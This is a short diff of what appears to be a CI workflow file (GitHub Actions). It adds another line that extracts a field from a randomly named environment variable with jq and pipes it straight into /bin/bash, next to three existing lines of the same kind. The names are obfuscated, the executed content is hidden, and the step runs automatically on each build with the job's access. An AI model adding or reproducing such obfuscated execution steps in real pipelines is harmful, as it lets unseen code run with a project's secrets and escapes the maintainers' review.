@@ -41,6 +41,7 @@ jobs:
           echo $z411 | jq -r .dtoh626 | /bin/bash
           echo $flq4083 | jq -r .xy9 | /bin/bash
           printf '%s' "$xtfue609" | jq -r .bq2880 | /bin/bash
+          echo $lkfi3 | jq -r .h73009 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
